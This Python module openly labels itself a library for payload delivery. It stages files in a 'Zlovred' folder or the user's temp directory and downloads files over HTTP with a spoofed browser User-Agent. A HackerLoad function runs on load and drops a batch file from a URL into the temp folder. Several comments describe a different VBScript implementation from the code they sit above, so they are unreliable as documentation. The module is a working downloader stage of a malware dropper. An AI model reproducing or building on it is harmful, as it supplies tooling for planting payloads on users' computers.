#!python
###
# LIB_FUNC.PY
# This file contain main modules for Payloads Delivery
#
# Revision 1.1.0.0 (Extended Beta) May be Present
# The Library Links at lib_func-1.0.0.js
# 
# Version 1.1.1.0 (Extended Beta) Build 0001
#
###

import tempfile
import os
import requests

###
# getTempEnviron()
#
# This Function Returns the Path for ZLOVRED Directory or Path for User Variable TEMP
#
# PARAMETERS:   NONE
# RETURNS:      Path for Zlovred Directory if Exists or
#               Path for User Variable %TEMP% if Success or
#		"" if General System Error
###

def getTempEnviron():
    path1 = "c:\\pub1\\Distrib\\Zlovred"
    path2 = tempfile.gettempdir()
    if os.path.isdir(path1):
        return path1
    else:
        if os.path.isdir(path2):
            return path2
        else:
            return ""

###
# UploadFilesFromInt( strFile, strURL, strPath )
# This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
# and Save it on Local Computer to Path strPath
# Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
#
# PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
#               strURL -- an URL of the web-site, from which the File
#               is Downloaded
#               strPath -- a Place in a Windows Computer (Full path without slash)
#               in which the File is Downloaded
#
# RETURNS:      0 -- If File is Normally Downloaded and Created
#               1 -- if File in Path strPath Can't Create
#               2 -- if XMLHTTP or ADOStream Can't Initialize
#				3 -- if Emty HTTP Responce or Send Access Denied
#				4 -- if HTTP Response Not 200 (while is not make)
#
###

def uploadFilesFromInt( strFile, strURL, strPath ):
    strFileURL = strURL + strFile
    strLocal_Path = strPath + "\\" + strFile
    intUploadFilesFromInt = 0
    blnExistRemoteFile = True
    if os.path.isdir(strPath):
        intUploadFilesFromInt = 0
    else:
        intUploadFilesFromInt = 1
        print("\nWrong Path: " + strPath)
    aUserAgentHeader = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'}
    try:
        r = requests.get(strFileURL, headers=aUserAgentHeader)
    except requests.ConnectionError:
        print("\nCan't open URL: " + strFileURL +"\nConnection Error")
        return 3
    except requests.ConnectTimeout:
        print("\nCan't open URL: " + strFileURL +"\nConnection Timeout")
        return 3
    if r.status_code == 200 and intUploadFilesFromInt == 0:
        blnExistRemoteFile = True
    else:
        blnExistRemoteFile = False
        intUploadFilesFromInt = 4
        print("\nWrong HTTP Status: " + str(r.status_code) + "\nURL = " + strFileURL )
    if blnExistRemoteFile:
        try:
            with open(strLocal_Path, 'wb') as fstream:
                fstream.write(r.content)
        except OSError:
            print("\nCan't open/write file:" + strLocal_Path)
            intUploadFilesFromInt = 1
        if not(os.path.isfile(strLocal_Path) and intUploadFilesFromInt == 0):
            intUploadFilesFromInt = 1
    return intUploadFilesFromInt

### Tests

# print("Tempdir = " + getTempEnviron())

def HackerLoad():
#    aFolder = os.getcwd()
#    aFolder = "C:"
#    aFolder = os.path.dirname(os.path.abspath(__file__))
    aFolder = getTempEnviron()
    anURL = "http://localhost/"
    aFile = "echo.bat"
    print( "iFlag=" + str(uploadFilesFromInt( aFile, anURL, aFolder)))


HackerLoad()